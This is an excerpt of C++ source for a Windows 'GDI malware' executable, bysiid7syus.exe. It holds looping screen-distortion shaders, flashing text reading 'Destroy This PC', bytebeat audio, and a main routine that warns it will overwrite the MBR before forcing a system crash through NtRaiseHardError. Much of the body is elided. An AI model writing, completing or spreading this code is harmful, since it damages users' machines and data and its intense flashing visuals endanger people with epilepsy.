//bysiid7syus.cpp in release x86
...
DWORD WINAPI shader1(LPVOID lpvd) //Credits WinMalware And Malsteve527 To VenraTech
{
	HDC hdc = GetDC(NULL);
	...
	float colorShift = 310.0;
	float colorIntensity = 0.40;
	...
	while (true)
	{
		...
		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				...
				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 2.0f);
				hslcolor.s = 3;
				hslcolor.l = fmod(hslcolor.l + (y % 25) / 100.0f, 2.0f);
...
DWORD WINAPI bounce(LPVOID lpParam) // VenraTech To Modified It
{
	HDC hdc;
	int sw, sh;
	double angle = 0.0;
	...
	while (1) {
		...
		xadd = cos(angle) * 15, yadd = tan(angle) * 15;
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 239, rand() % 239, rand() % 239));
		SelectObject(hdc, brush);
		BitBlt(hdc, xadd, yadd, sw, sh, hdc, 0, 0, 0xffff);
		angle += M_PI / 10;
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	...
	while (1)
	{
		...
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				...
				int fx = (int)((i * 4) + (i * 4) * sin(x / 24.0));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .10f, 1.f);
...
DWORD WINAPI polygon1(LPVOID lpParam) {
	...
	while (1) {
		...
		POINT vertices[] = { {x + 300, y + 100}, {x + 200, y + 200}, {x + 100, y + 200} };
...
DWORD WINAPI shader3(LPVOID lpvd)
{
	...
	while (1)
	{
		...
		i++;
		StretchBlt(hdc, 1, 1, w - 2, h - 2, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}
...
DWORD WINAPI textout(LPVOID lpvd) //credits to N17Pro3426 for the resized text
{
	...
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "bysiid7syus.exe";
		text1 = "Destroy This PC";
		SetTextColor(hdc, Hue(239));
		HFONT font = CreateFontA(rand() % 32, rand() % 26, 0, 0, FW_THIN, 0, rand() % 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
...
VOID WINAPI sound1() {
	...
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8 | t >> 1) & (+t >> 8));
...
VOID WINAPI sound2() {
	...
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(463 * t * (t >> 8 | t >> 2) & t);
...
VOID WINAPI sound3() {
	...
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 3 | t | t >> 9) * 10 - 4 * (t & t >> 1));
...
VOID WINAPI sound4() {
	...
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 7 | t >> 9) & t);
...
VOID WINAPI sound5() {
	...
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>(t & (t >> 7 | t >> 7));
...
VOID WINAPI sound6() {
	...
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>((2 * t & 25734) * (t >> 6 & 255) >> 9);
...
{
	if (MessageBoxW(NULL, L"A Malware Run?", L"bysiid7syus.exe by NindowsCahel132", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? Release x86, Overwrite Mbr - NOT for epilepsy", L"F̷i̷n̸a̴l̴ ̴W̸a̴r̸n̷i̸n̷g̷ - bysiid7syus.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			...
			HANDLE thread3dot1 = CreateThread(0, 0, polygon1, 0, 0, 0);
			sound3();
			Sleep(30000);
			...
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, tanwaves1, 0, 0, 0);
			sound6();
			Sleep(30000);
			...
			NtRaiseHardError(0xC000FFFF, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}